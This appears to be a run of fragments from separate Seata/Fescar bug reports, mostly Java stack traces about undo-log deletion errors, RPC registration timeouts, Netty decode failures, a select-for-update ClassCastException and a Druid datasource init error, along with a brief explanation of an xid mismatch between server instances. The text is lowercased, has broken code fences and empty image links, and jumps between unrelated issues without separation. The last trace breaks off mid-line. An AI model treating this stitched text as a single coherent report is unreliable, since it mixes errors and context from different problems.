``` global transation is committd asynchronously, so this phase may be processed on another seata server instance.when another seata server try to commit global transaction, in `defaultcore.doglobalcommit()`:
``` branchstatus branchstatus = resourcemanagerinbound.branchcommit( branchsession.getbranchtype(), xid.generatexid(branchsession.gettransactionid()), branchsession.getbranchid(), branchsession.getresourceid(), branchsession.getapplicationdata());
xid is used to look for global transaction from the repository, while this xid is generated by this seata server's address(whick is different from it's orginal one).when setting db table as repository, none record can be found and branch committing is a default success, in `defaultcoordinator.branchcommit()`:
globalsession globalsession = sessionholder.findglobalsession(xid);
if(globalsession == null){ return branchstatus.phasetwo_committed;
after all branch transation is processed as default success, global transaction is ended which seata server will delete it from db repository, in `defaultcore.doglobalcommit()` :
sessionhelper.endcommitted(globalsession);
``` as a result, so some rm cannot receive branchtransactioncommitrequest.
2019-05-17 14:04:11.908 error druid.sql.statement:149 - {conn-10010, pstmt-20016} execute error
delete from undo_log where branch_id in (?) and xid in (?,?,?) limit 1000
com.mysql.cj.jdbc.exceptions.mysqldatatruncation: data truncation: truncated incorrect double value: '192.168.1.63:8091:2011180688' at com.mysql.cj.jdbc.exceptions.sqlexceptionsmapping.translateexception(sqlexceptionsmapping.java:104) at com.mysql.cj.jdbc.clientpreparedstatement.executeinternal(clientpreparedstatement.java:960) at com.mysql.cj.jdbc.clientpreparedstatement.executeupdateinternal(clientpreparedstatement.java:1116) at com.mysql.cj.jdbc.clientpreparedstatement.executeupdateinternal(clientpreparedstatement.java:1066) at com.mysql.cj.jdbc.clientpreparedstatement.executelargeupdate(clientpreparedstatement.java:1396) at com.mysql.cj.jdbc.clientpreparedstatement.executeupdate(clientpreparedstatement.java:1051) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_executeupdate(filterchainimpl.java:3201) at com.alibaba.druid.filter.filteradapter.preparedstatement_executeupdate(filteradapter.java:1091) at com.alibaba.druid.filter.filtereventadapter.preparedstatement_executeupdate(filtereventadapter.java:491) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_executeupdate(filterchainimpl.java:3199) at com.alibaba.druid.filter.filteradapter.preparedstatement_executeupdate(filteradapter.java:1091) at com.alibaba.druid.filter.filtereventadapter.preparedstatement_executeupdate(filtereventadapter.java:491) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_executeupdate(filterchainimpl.java:3199) at com.alibaba.druid.filter.filteradapter.preparedstatement_executeupdate(filteradapter.java:1091) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_executeupdate(filterchainimpl.java:3199) at com.alibaba.druid.proxy.jdbc.preparedstatementproxyimpl.executeupdate(preparedstatementproxyimpl.java:194) at com.alibaba.druid.pool.druidpooledpreparedstatement.executeupdate(druidpooledpreparedstatement.java:256) at io.seata.rm.datasource.undo.undologmanager.batchdeleteundolog(undologmanager.java:254) at io.seata.rm.datasource.asyncworker.dobranchcommits(asyncworker.java:196) at io.seata.rm.datasource.asyncworker.access$000(asyncworker.java:54) at io.seata.rm.datasource.asyncworker$1.run(asyncworker.java:132) at java.util.concurrent.executors$runnableadapter.call(executors.java:511) at java.util.concurrent.futuretask.runandreset(futuretask.java:308) at java.util.concurrent.scheduledthreadpoolexecutor$scheduledfuturetask.access$301(scheduledthreadpoolexecutor.java:180) at java.util.concurrent.scheduledthreadpoolexecutor$scheduledfuturetask.run(scheduledthreadpoolexecutor.java:294) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748)
2019-05-17 14:04:11.908 warn io.seata.rm.datasource.asyncworker:198 - failed to batch delete undo log [[2011180689, 2011180690, 2011180691]/[192.168.1.63:8091:2011180688]]
com.mysql.cj.jdbc.exceptions.mysqldatatruncation: data truncation: truncated incorrect double value: '192.168.1.63:8091:2011180688' at com.mysql.cj.jdbc.exceptions.sqlexceptionsmapping.translateexception(sqlexceptionsmapping.java:104) at com.mysql.cj.jdbc.clientpreparedstatement.executeinternal(clientpreparedstatement.java:960) at com.mysql.cj.jdbc.clientpreparedstatement.executeupdateinternal(clientpreparedstatement.java:1116) at com.mysql.cj.jdbc.clientpreparedstatement.executeupdateinternal(clientpreparedstatement.java:1066) at com.mysql.cj.jdbc.clientpreparedstatement.executelargeupdate(clientpreparedstatement.java:1396) at com.mysql.cj.jdbc.clientpreparedstatement.executeupdate(clientpreparedstatement.java:1051) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_executeupdate(filterchainimpl.java:3201) at com.alibaba.druid.filter.filteradapter.preparedstatement_executeupdate(filteradapter.java:1091) at com.alibaba.druid.filter.filtereventadapter.preparedstatement_executeupdate(filtereventadapter.java:491) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_executeupdate(filterchainimpl.java:3199) at com.alibaba.druid.filter.filteradapter.preparedstatement_executeupdate(filteradapter.java:1091) at com.alibaba.druid.filter.filtereventadapter.preparedstatement_executeupdate(filtereventadapter.java:491) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_executeupdate(filterchainimpl.java:3199) at com.alibaba.druid.filter.filteradapter.preparedstatement_executeupdate(filteradapter.java:1091) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_executeupdate(filterchainimpl.java:3199) at com.alibaba.druid.proxy.jdbc.preparedstatementproxyimpl.executeupdate(preparedstatementproxyimpl.java:194) at com.alibaba.druid.pool.druidpooledpreparedstatement.executeupdate(druidpooledpreparedstatement.java:256) at io.seata.rm.datasource.undo.undologmanager.batchdeleteundolog(undologmanager.java:254) at io.seata.rm.datasource.asyncworker.dobranchcommits(asyncworker.java:196) at io.seata.rm.datasource.asyncworker.access$000(asyncworker.java:54) at io.seata.rm.datasource.asyncworker$1.run(asyncworker.java:132) at java.util.concurrent.executors$runnableadapter.call(executors.java:511) at java.util.concurrent.futuretask.runandreset(futuretask.java:308) at java.util.concurrent.scheduledthreadpoolexecutor$scheduledfuturetask.access$301(scheduledthreadpoolexecutor.java:180) at java.util.concurrent.scheduledthreadpoolexecutor$scheduledfuturetask.run(scheduledthreadpoolexecutor.java:294) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748)
the size is wrong between xidsize and branchidsize ``` ```
java.lang.noclassdeffounderror: io/seata/core/rpc/servermessagesender at java.lang.class.getdeclaredmethods0(native method) at java.lang.class.privategetdeclaredmethods(class.java:2701) at java.lang.class.privategetmethodrecursive(class.java:3048) at java.lang.class.getmethod0(class.java:3018) at java.lang.class.getmethod(class.java:1784) at sun.launcher.launcherhelper.validatemainclass(launcherhelper.java:544) at sun.launcher.launcherhelper.checkandloadmain(launcherhelper.java:526)
caused by: java.lang.classnotfoundexception: io.seata.core.rpc.servermessagesender at java.net.urlclassloader.findclass(urlclassloader.java:382) at java.lang.classloader.loadclass(classloader.java:424) at sun.misc.launcher$appclassloader.loadclass(launcher.java:349) at java.lang.classloader.loadclass(classloader.java:357) ..
error: a jni error has occurred, please check your installation and try again
exception in thread "main" ```
![image]( ``` ```
when use update statements for bulk records in on local transaction ![image]( ```
![image](
![image](
``` 04-29 21:11:26.544 error [-,,,] 13448 --- [imeoutchecker_1] c.a.f.c.r.n.abstractrpcremotingclient : 0101 com.alibaba.fescar.common.exception.frameworkexception: can not register tm,err:register error,role:tmrole,err:cost 30003 ms at com.alibaba.fescar.core.rpc.netty.tmrpcclient.doconnect(tmrpcclient.java:349) at com.alibaba.fescar.core.rpc.netty.tmrpcclient.connect(tmrpcclient.java:281) at com.alibaba.fescar.core.rpc.netty.abstractrpcremotingclient.reconnect(abstractrpcremotingclient.java:348) at com.alibaba.fescar.core.rpc.netty.tmrpcclient$1.run(tmrpcclient.java:164) at java.util.concurrent.executors$runnableadapter.call(executors.java:511) at java.util.concurrent.futuretask.runandreset$$$capture(futuretask.java:308) at java.util.concurrent.futuretask.runandreset(futuretask.java) at java.util.concurrent.scheduledthreadpoolexecutor$scheduledfuturetask.access$301(scheduledthreadpoolexecutor.java:180) at java.util.concurrent.scheduledthreadpoolexecutor$scheduledfuturetask.run(scheduledthreadpoolexecutor.java:294) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748)
org.springframework.jdbc.uncategorizedsqlexception: statementcallback; uncategorized sqlexception for sql [select * from account_tbl where id='101' for update ]; sql state [null]; error code [0]; io.seata.core.exception.transactionexception: response[runtimeexception[null]]; nested exception is java.sql.sqlexception: io.seata.core.exception.transactionexception: response[runtimeexception[null]] at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:89) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) at org.springframework.jdbc.core.jdbctemplate.translateexception(jdbctemplate.java:1444) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:388) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:418) at com.alibaba.fescar.workshop.service.impl.orderserviceimpl.create(orderserviceimpl.java:93) at com.alibaba.dubbo.common.bytecode.wrapper2.invokemethod(wrapper2.java) at com.alibaba.dubbo.rpc.proxy.javassist.javassistproxyfactory$1.doinvoke(javassistproxyfactory.java:47) at com.alibaba.dubbo.rpc.proxy.abstractproxyinvoker.invoke(abstractproxyinvoker.java:76) at com.alibaba.dubbo.config.invoker.delegateprovidermetadatainvoker.invoke(delegateprovidermetadatainvoker.java:52) at com.alibaba.dubbo.rpc.protocol.invokerwrapper.invoke(invokerwrapper.java:56) at io.seata.dubbo.alibaba.transactionpropagationfilter.invoke(transactionpropagationfilter.java:61) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.exceptionfilter.invoke(exceptionfilter.java:62) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.monitor.support.monitorfilter.invoke(monitorfilter.java:75) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.timeoutfilter.invoke(timeoutfilter.java:42) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.protocol.dubbo.filter.tracefilter.invoke(tracefilter.java:78) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.contextfilter.invoke(contextfilter.java:73) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.genericfilter.invoke(genericfilter.java:138) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.classloaderfilter.invoke(classloaderfilter.java:38) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.echofilter.invoke(echofilter.java:38) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.protocol.dubbo.dubboprotocol$1.reply(dubboprotocol.java:104) at com.alibaba.dubbo.remoting.exchange.support.header.headerexchangehandler.handlerequest(headerexchangehandler.java:96) at com.alibaba.dubbo.remoting.exchange.support.header.headerexchangehandler.received(headerexchangehandler.java:173) at com.alibaba.dubbo.remoting.transport.decodehandler.received(decodehandler.java:51) at com.alibaba.dubbo.remoting.transport.dispatcher.channeleventrunnable.run(channeleventrunnable.java:57) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748)
caused by: java.sql.sqlexception: io.seata.core.exception.transactionexception: response[runtimeexception[null]] at io.seata.rm.datasource.connectionproxy.recognizelockkeyconflictexception(connectionproxy.java:133) at io.seata.rm.datasource.connectionproxy.checklock(connectionproxy.java:110) at io.seata.rm.datasource.exec.selectforupdateexecutor.doexecute(selectforupdateexecutor.java:112) at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:86) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) at io.seata.rm.datasource.statementproxy.execute(statementproxy.java:89) at org.springframework.jdbc.core.jdbctemplate$1executestatementcallback.doinstatement(jdbctemplate.java:409) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:376) ..
33 common frames omitted
caused by: io.seata.core.exception.transactionexception: response[runtimeexception[null]] at io.seata.rm.datasource.datasourcemanager.lockquery(datasourcemanager.java:96) at io.seata.rm.defaultresourcemanager.lockquery(defaultresourcemanager.java:109) at io.seata.rm.datasource.connectionproxy.checklock(connectionproxy.java:105) ..
40 common frames omitted
[04-25 19:42:27,110 error] [nettyclientselector_tmrole_1] netty.abstractrpcremoting - 0318
io.netty.handler.codec.decoderexception: java.lang.nullpointerexception at io.netty.handler.codec.bytetomessagedecoder.calldecode(bytetomessagedecoder.java:459) at io.netty.handler.codec.bytetomessagedecoder.channelread(bytetomessagedecoder.java:265) at io.netty.handler.codec.bytetomessagecodec.channelread(bytetomessagecodec.java:103) at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:362) at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:348) at io.netty.channel.abstractchannelhandlercontext.firechannelread(abstractchannelhandlercontext.java:340) at io.netty.handler.timeout.idlestatehandler.channelread(idlestatehandler.java:286) at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:362) at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:348) at io.netty.channel.abstractchannelhandlercontext.firechannelread(abstractchannelhandlercontext.java:340) at io.netty.channel.defaultchannelpipeline$headcontext.channelread(defaultchannelpipeline.java:1434) at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:362) at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:348) at io.netty.channel.defaultchannelpipeline.firechannelread(defaultchannelpipeline.java:965) at io.netty.channel.nio.abstractniobytechannel$niobyteunsafe.read(abstractniobytechannel.java:163) at io.netty.channel.nio.nioeventloop.processselectedkey(nioeventloop.java:645) at io.netty.channel.nio.nioeventloop.processselectedkeysoptimized(nioeventloop.java:580) at io.netty.channel.nio.nioeventloop.processselectedkeys(nioeventloop.java:497) at io.netty.channel.nio.nioeventloop.run(nioeventloop.java:459) at io.netty.util.concurrent.singlethreadeventexecutor$5.run(singlethreadeventexecutor.java:884) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748)
caused by: java.lang.nullpointerexception at io.seata.core.protocol.mergeresultmessage.tostring(mergeresultmessage.java:119) at java.lang.string.valueof(string.java:2994) at java.lang.stringbuilder.append(stringbuilder.java:131) at io.seata.core.rpc.netty.messagecodechandler.decode(messagecodechandler.java:189) at io.netty.handler.codec.bytetomessagecodec$1.decode(bytetomessagecodec.java:42) at io.netty.handler.codec.bytetomessagedecoder.decoderemovalreentryprotection(bytetomessagedecoder.java:489) at io.netty.handler.codec.bytetomessagedecoder.calldecode(bytetomessagedecoder.java:428) ..
[04-25 19:42:27,110 error] [nettyclientselector_tmrole_1] netty.messagecodechandler - codec decode not found magic offset
no exception , seata server has no action after restarted , even thought the root.data exits one uncomplete transaction
### error querying database
cause: java.sql.sqlexception: java.lang.classcastexception: class java.lang.boolean cannot be cast to class java.sql.resultset (java.lang.boolean is in module java.base of loader 'bootstrap'; java.sql.resultset is in module java.sql of loader 'platform')
### the error may exist in file [d:\\workspace\\learnworkspace\\fescar-samples\\dubbo\\target\\classes\\mapper\\accountmapper.xml]
### the error may involve com.alibaba.fescar.samples.dubbo.dao.accountdao.getaccountbyuseridforlock-inline
### the error occurred while setting parameters
### sql: select * from account_tbl where user_id = ? for update
### cause: java.sql.sqlexception: java.lang.classcastexception: class java.lang.boolean cannot be cast to class java.sql.resultset (java.lang.boolean is in module java.base of loader 'bootstrap'; java.sql.resultset is in module java.sql of loader 'platform')
; uncategorized sqlexception; sql state [null]; error code [0]; java.lang.classcastexception: class java.lang.boolean cannot be cast to class java.sql.resultset (java.lang.boolean is in module java.base of loader 'bootstrap'; java.sql.resultset is in module java.sql of loader 'platform'); nested exception is java.sql.sqlexception: java.lang.classcastexception: class java.lang.boolean cannot be cast to class java.sql.resultset (java.lang.boolean is in module java.base of loader 'bootstrap'; java.sql.resultset is in module java.sql of loader 'platform') at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:89) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) at org.mybatis.spring.mybatisexceptiontranslator.translateexceptionifpossible(mybatisexceptiontranslator.java:73) at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:446) at com.sun.proxy.$proxy13.selectone(unknown source) at org.mybatis.spring.sqlsessiontemplate.selectone(sqlsessiontemplate.java:166) at org.apache.ibatis.binding.mappermethod.execute(mappermethod.java:87) at org.apache.ibatis.binding.mapperproxy.invoke(mapperproxy.java:58) at com.sun.proxy.$proxy14.getaccountbyuseridforlock(unknown source) at com.alibaba.fescar.samples.dubbo.service.impl.accountserviceimpl$2.dointransaction(accountserviceimpl.java:102) ..
caused by: java.sql.sqlexception: java.lang.classcastexception: class java.lang.boolean cannot be cast to class java.sql.resultset (java.lang.boolean is in module java.base of loader 'bootstrap'; java.sql.resultset is in module java.sql of loader 'platform') at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:107) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:48) at io.seata.rm.datasource.preparedstatementproxy.execute(preparedstatementproxy.java:66) at org.apache.ibatis.executor.statement.preparedstatementhandler.query(preparedstatementhandler.java:64) at org.apache.ibatis.executor.statement.routingstatementhandler.query(routingstatementhandler.java:79) at org.apache.ibatis.executor.simpleexecutor.doquery(simpleexecutor.java:63) at org.apache.ibatis.executor.baseexecutor.queryfromdatabase(baseexecutor.java:324) at org.apache.ibatis.executor.baseexecutor.query(baseexecutor.java:156) at org.apache.ibatis.executor.cachingexecutor.query(cachingexecutor.java:109) at org.apache.ibatis.executor.cachingexecutor.query(cachingexecutor.java:83) at org.apache.ibatis.session.defaults.defaultsqlsession.selectlist(defaultsqlsession.java:147) at org.apache.ibatis.session.defaults.defaultsqlsession.selectlist(defaultsqlsession.java:140) at org.apache.ibatis.session.defaults.defaultsqlsession.selectone(defaultsqlsession.java:76) at java.base/jdk.internal.reflect.nativemethodaccessorimpl.invoke0(native method) at java.base/jdk.internal.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at java.base/jdk.internal.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.base/java.lang.reflect.method.invoke(method.java:566) at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:433) ..
caused by: java.lang.classcastexception: class java.lang.boolean cannot be cast to class java.sql.resultset (java.lang.boolean is in module java.base of loader 'bootstrap'; java.sql.resultset is in module java.sql of loader 'platform') at io.seata.rm.datasource.exec.selectforupdateexecutor.doexecute(selectforupdateexecutor.java:86) at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:87) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:102) ..
56 more ```
sql:update u_member set isenable = 1 where id in (56,57) ```
caused by: java.lang.nullpointerexception: null at com.alibaba.fescar.rm.datasource.preparedstatementproxy.execute(preparedstatementproxy.java:62) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.apache.ibatis.logging.jdbc.preparedstatementlogger.invoke(preparedstatementlogger.java:59) at com.sun.proxy.$proxy198.execute(unknown source) at org.apache.ibatis.executor.statement.preparedstatementhandler.update(preparedstatementhandler.java:47) at org.apache.ibatis.executor.statement.routingstatementhandler.update(routingstatementhandler.java:74) at org.apache.ibatis.executor.simpleexecutor.doupdate(simpleexecutor.java:50) at org.apache.ibatis.executor.baseexecutor.update(baseexecutor.java:117) at org.apache.ibatis.executor.cachingexecutor.update(cachingexecutor.java:76) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.apache.ibatis.plugin.plugin.invoke(plugin.java:63) at com.sun.proxy.$proxy196.update(unknown source) at org.apache.ibatis.session.defaults.defaultsqlsession.update(defaultsqlsession.java:198) ..
92 common frames omitted
check the proxy of dubbo.
2019-04-18 18:05:11.761 [main] info org.springframework.context.support.postprocessorregistrationdelegate$beanpostprocessorchecker - bean 'org.springframework.transaction.annotation.proxytransactionmanagementconfiguration' of type [org.springframework.transaction.annotation.proxytransactionmanagementconfiguration$$enhancerbyspringcglib$$926d0367] is not eligible for getting processed by all beanpostprocessors (for example: not eligible for auto-proxying)
2019-04-18 18:05:11.798 [main] info org.springframework.context.support.postprocessorregistrationdelegate$beanpostprocessorchecker - bean 'org.springframework.cloud.autoconfigure.configurationpropertiesrebinderautoconfiguration' of type [org.springframework.cloud.autoconfigure.configurationpropertiesrebinderautoconfiguration$$enhancerbyspringcglib$$ae870664] is not eligible for getting processed by all beanpostprocessors (for example: not eligible for auto-proxying)
2019-04-18 18:05:11.956 [main] error com.alibaba.druid.pool.druiddatasource - {datasource-1} init error
java.sql.sqlexception: url not set at com.alibaba.druid.pool.druiddatasource.init(druiddatasource.java:828) ~[druid-1.1.12.jar:1.1.12] at com.alibaba.druid.pool.druiddatasource.getconnection(druiddatasource.java:1246) ~[druid-1.1.12.jar:1.1.12] at com.alibaba.druid.pool.druiddatasource.getconnection(druiddatasource.java:1242) ~[druid-1.1.12.jar:1.1.12] at com.alibaba.druid.pool.druiddatasource.getconnection(druiddatasource.java:89) ~[druid-1.1.12.jar:1.1.12] at com.alibaba.fescar.rm.datasource.datasourceproxy.init(datasourceproxy.java:67) ~[fescar-rm-datasource-0.4.2.jar:?] at com.alibaba.fescar.rm.datasource.datasourceproxy.<init>(datasourceproxy.java:62) ~[fescar-rm-datasource-0.4.2.jar:?] at com.alibaba.fescar.rm.datasource.datasourceproxy.<init>(datasourceproxy.java:51) ~[fescar-rm-datasource-0.4.2.jar:?] at com.winsky.platform.data.mybatis.config.datasourceconfig.datasourceproxy(datasourceconfig.java:55) ~[platform-data-mybatis-1.2.0.jar:1.2.0] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[?:1.8.0_73] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[?:1.8.0_73] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[?:1.8.0_73] at java.lang.reflect.method.invoke(method.java:497) ~[?:1.8.0_73] at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:154) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:582) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.instantiateusingfactorymethod(abstractautowirecapablebeanfactory.java:1247) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1096) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:535) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:495) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractbeanfactory.lambda$dogetbean$0(abstractbeanfactory.java:317) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:222) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:315) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:199) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.config.dependencydescriptor.resolvecandidate(dependencydescriptor.java:251) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.doresolvedependency(defaultlistablebeanfactory.java:1135) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvedependency(defaultlistablebeanfactory.java:1062) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.constructorresolver.resolveautowiredargument(constructorresolver.java:818) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.constructorresolver.createargumentarray(constructorresolver.java:724) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:474) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.instantiateusingfactorymethod(abstractautowirecapablebeanfactory.java:1247) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1096) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:535) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:495) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractbeanfactory.lambda$dogetbean$0(abstractbeanfactory.java:317) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:222) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:315) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:199) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.config.dependencydescriptor.resolvecandidate(dependencydescriptor.java:251) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.doresolvedependency(defaultlistablebeanfactory.java:1135) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvedependency(defaultlistablebeanfactory.java:1062) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.autowirebytype(abstractautowirecapablebeanfactory.java:1421) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.populatebean(abstractautowirecapablebeanfactory.java:1323) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:572) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:495) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractbeanfactory.lambda$dogetbean$0(abstractbeanfactory.java:317) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:222) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:315) ~[spring-beans-5.0.8.release.jar:5.0.8.release] at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:199) 